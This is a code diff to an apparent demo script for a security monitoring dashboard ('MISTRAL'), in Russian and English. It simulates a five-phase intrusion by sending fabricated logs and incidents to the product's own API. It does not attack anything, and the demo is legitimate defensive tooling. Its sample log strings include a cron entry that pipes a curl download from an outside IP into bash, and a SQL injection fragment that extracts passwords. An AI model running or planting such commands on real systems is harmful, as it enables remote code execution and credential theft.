@@ -32,6 +32,39 @@ def api_request(path, data):
         print(f"   [!] Ошибка соединения с сервером ({url}): {e}")
         return None
 
+def print_color(text, color):
+    colors = {
+        'red': '\033[91m',
+        'green': '\033[92m',
+        'yellow': '\033[93m',
+        'blue': '\033[94m',
+        'purple': '\033[95m',
+        'cyan': '\033[96m',
+        'end': '\033[0m'
+    }
+    # Simple fallback if terminal doesn't support ANSI
+    if os.name == 'nt':
+        os.system('') # Enable VT100 Escape Sequence for WINDOWS 10
+    print(f"{colors.get(color, '')}{text}{colors['end']}")
+
+def simulate_progress(task_name, duration_sec):
+    print(f" [*] {task_name} ", end='', flush=True)
+    steps = 10
+    sleep_time = duration_sec / steps
+    for _ in range(steps):
+        time.sleep(sleep_time)
+        print(".", end='', flush=True)
+    print(" [DONE]")
+
+def send_metric_spike(cpu, ram, disk):
+    api_request('/api/metrics', {
+        'cpu': cpu,
+        'ram': {'percent': ram},
+        'disk': {'percent': disk},
+        'connections': 142,
+        'monitor': 'monitor_system'
+    })
+
 def main():
     global BASE_URL
     print_header()
@@ -43,78 +76,108 @@ def main():
         target = "http://" + target
     BASE_URL = target.rstrip('/')
 
-    print("\n ГОТОВ К ЗАПУСКУ.")
-    print(f" Цель атаки: {BASE_URL}")
-    print(" Убедитесь, что MISTRAL Server запущен по этому адресу.")
-    print("\n Нажмите ENTER, чтобы начать симуляцию атаки...")
+    print_color("\n [ MISTRAL ATTACK FRAMEWORK v2.0 ]", "red")
+    print(f" Target: {BASE_URL}")
+    print(" Status: ARMED AND READY")
+    print(" \n Нажмите ENTER, чтобы запустить симуляцию APT-атаки (Phase 1-5)...")
     input()
     
-    print_header()
-    print(" [🚀] Симуляция запущена! Начинаю атаку...\n")
-    time.sleep(1)
+    clear_screen()
+    print_color("""
+    ███╗   ███╗██╗███████╗████████╗██████╗  █████╗ ██╗     
+    ████╗ ████║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║     
+    ██╔████╔██║██║███████╗   ██║   ██████╔╝███████║██║     
+    ██║╚██╔╝██║██║╚════██║   ██║   ██╔══██╗██╔══██║██║     
+    ██║ ╚═╝ ██║██║███████║   ██║   ██║  ██║██║  ██║███████╗
+    ╚═╝     ╚═╝╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
+    [ ADVANCED PERSISTENT THREAT SIMULATOR INITIATED ]
+    """, "red")
+    time.sleep(2)
 
-    # ФАЗА 1
-    print(" >> [ФАЗА 1]: Сканирование портов (Nmap SYN Stealth)")
+    # ---------------------------------------------------------
+    # PHASE 1: RECON
+    # ---------------------------------------------------------
+    print_color("\n === [PHASE 1] RECONNAISSANCE & SCANNING ===", "cyan")
+    simulate_progress("Running Nmap Stealth Scan", 2)
     for i in range(1, 4):
-        api_request('/api/logs', {
-            'type': 'server', 
-            'level': 'warn', 
-            'message': f'[Firewall] SYN flood detected from 103.45.2.19 - port scan attempt {i}/3'
-        })
-        time.sleep(2.5)
+        api_request('/api/logs', {'type': 'network', 'level': 'warn', 'message': f'[Firewall] SYN flood detected from 103.45.2.19 - port scan attempt {i}/3'})
+        time.sleep(0.5)
+    
+    api_request('/api/incidents', {
+        'severity': 'LOW', 'monitor': 'monitor_network', 'type': 'Port Scan Detected',
+        'description': 'Targeted port scan from 103.45.2.19. Nmap SYN Stealth signature detected.'
+    })
+    print_color("  -> [LOW] Incident logged on server.", "green")
+    time.sleep(3)
+
+    # ---------------------------------------------------------
+    # PHASE 2: INITIAL ACCESS
+    # ---------------------------------------------------------
+    print_color("\n === [PHASE 2] INITIAL ACCESS (BRUTE-FORCE) ===", "cyan")
+    simulate_progress("Executing Hydra SSH Brute-Force", 3)
+    for i in range(1, 6):
+        api_request('/api/logs', {'type': 'auth', 'level': 'warn', 'message': f'[SSH] Failed password for root from 103.45.2.19 port 4833{i} ssh2'})
+        time.sleep(0.3)
+    
+    api_request('/api/logs', {'type': 'auth', 'level': 'error', 'message': '[SSH] Session opened for root by 103.45.2.19'})
+    
+    api_request('/api/incidents', {
+        'severity': 'MEDIUM', 'monitor': 'monitor_auth', 'type': 'Brute-force SSH Success',
+        'description': 'Multiple failed SSH logins followed by a successful root session from 103.45.2.19.'
+    })
+    print_color("  -> [MEDIUM] Incident logged: SSH Compromised.", "yellow")
+    time.sleep(3)
+
+    # ---------------------------------------------------------
+    # PHASE 3: WEB EXPLOITATION
+    # ---------------------------------------------------------
+    print_color("\n === [PHASE 3] WEB APP EXPLOITATION (SQLi) ===", "cyan")
+    simulate_progress("Bypassing WAF & Injecting Payload", 2)
+    api_request('/api/logs', {'type': 'waf', 'level': 'error', 'message': "[WAF] Warning: Suspicious payload matching rule SQLI_AUTH"})
+    api_request('/api/logs', {'type': 'db', 'level': 'error', 'message': "[DB] SQL Syntax error near 'UNION SELECT NULL, password FROM users--'"})
+    
+    api_request('/api/incidents', {
+        'severity': 'HIGH', 'monitor': 'monitor_waf', 'type': 'SQL Injection / WAF Bypass',
+        'description': 'Attacker 103.45.2.19 bypassed WAF rules and successfully executed SQL injection on /api/auth endpoint. Possible password hash leak.'
+    })
+    print_color("  -> [HIGH] Incident logged: SQLi Success.", "yellow")
+    time.sleep(3)
+
+    # ---------------------------------------------------------
+    # PHASE 4: PRIVILEGE ESCALATION
+    # ---------------------------------------------------------
+    print_color("\n === [PHASE 4] PRIVILEGE ESCALATION & PERSISTENCE ===", "cyan")
+    simulate_progress("Uploading kernel exploit (DirtyPipe)", 3)
+    api_request('/api/logs', {'type': 'system', 'level': 'critical', 'message': "[Kernel] Unhandled fault: page domain fault (11)"})
+    api_request('/api/logs', {'type': 'system', 'level': 'error', 'message': "[Audit] Unauthorized modification of /etc/shadow"})
+    api_request('/api/logs', {'type': 'system', 'level': 'error', 'message': "[Cron] New unknown crontab entry for user root: '* * * * * curl http://103.45.2.19/rev | bash'"})
+    
+    api_request('/api/incidents', {
+        'severity': 'CRITICAL', 'monitor': 'monitor_system', 'type': 'Privilege Escalation & Persistence',
+        'description': 'Kernel exploit detected. /etc/shadow modified and malicious cron job established. System is fully compromised.'
+    })
+    print_color("  -> [CRITICAL] Incident logged: Root Compromised.", "red")
+    time.sleep(4)
+
+    # ---------------------------------------------------------
+    # PHASE 5: IMPACT (RANSOMWARE)
+    # ---------------------------------------------------------
+    print_color("\n === [PHASE 5] IMPACT (RANSOMWARE DEPLOYMENT) ===", "red")
+    print_color(" [!] SPIKING SERVER METRICS TO 100% CPU...", "yellow")
+    send_metric_spike(100, 95, 99)
+    simulate_progress("Encrypting /var/www and /home directories", 5)
+    
+    for i in range(1, 10):
+        api_request('/api/logs', {'type': 'system', 'level': 'critical', 'message': f"[Filemon] Mass encryption detected. File: /var/www/data_{i}.enc"})
+        time.sleep(0.2)
         
     api_request('/api/incidents', {
-        'severity': 'MEDIUM',
-        'monitor': 'monitor_network',
-        'type': 'Port Scan Detected',
-        'description': 'Обнаружено целенаправленное сканирование открытых портов с адреса 103.45.2.19. Использован Nmap SYN Stealth.'
+        'severity': 'CRITICAL', 'monitor': 'monitor_system', 'type': 'Ransomware Activity Detected',
+        'description': 'Massive file encryption in progress. CPU spiked to 100%. Ransom note dropped in /root/README.txt'
     })
-    print("    -> Инцидент [MEDIUM] отправлен на сервер.")
-    time.sleep(6)
-
-    # ФАЗА 2
-    print("\n >> [ФАЗА 2]: Медленный Брутфорс SSH")
-    for i in range(1, 6):
-        api_request('/api/logs', {
-            'type': 'server', 
-            'level': 'warn', 
-            'message': f'[SSH] Failed password for root from 103.45.2.19 port 4833{i} ssh2'
-        })
-        time.sleep(2)
-
-    api_request('/api/incidents', {
-        'severity': 'HIGH',
-        'monitor': 'monitor_auth',
-        'type': 'Brute-force SSH',
-        'description': 'Серия неудачных попыток авторизации по SSH от 103.45.2.19. Злоумышленник пытается подобрать пароль root.'
-    })
-    print("    -> Инцидент [HIGH] отправлен. Ожидайте уведомление в Telegram!")
-    time.sleep(8)
-
-    # ФАЗА 3
-    print("\n >> [ФАЗА 3]: Эксплуатация уязвимости WAF (SQL Injection)")
-    api_request('/api/logs', {
-        'type': 'server', 
-        'level': 'error', 
-        'message': "[WAF] Warning: Suspicious payload matching rule SQLI_AUTH"
-    })
-    time.sleep(3)
     
-    api_request('/api/logs', {
-        'type': 'server', 
-        'level': 'error', 
-        'message': "[DB] SQL Syntax error near 'UNION SELECT NULL, password FROM users--'"
-    })
-    time.sleep(2)
-    
-    api_request('/api/incidents', {
-        'severity': 'CRITICAL',
-        'monitor': 'monitor_waf',
-        'type': 'SQL Injection / WAF Bypass',
-        'description': 'Злоумышленник 103.45.2.19 обошел правила WAF и выполнил успешную SQL-инъекцию в эндпоинте /api/auth. Возможна утечка хэшей паролей!'
-    })
-    print("    -> Инцидент [CRITICAL] отправлен.")
-    
+    print_color("\n [☠️] ATTACK SIMULATION COMPLETE. SERVER IS NUKED.", "red")
+    print_color(" Check the Mistral Client Dashboard to see the damage.", "yellow")
     print("\n="*60)
     print(" [✅] Демонстрационная атака завершена!")
     print(" Теперь вы можете нажать кнопку [🧠 АНАЛИЗ ИИ] в Telegram.")
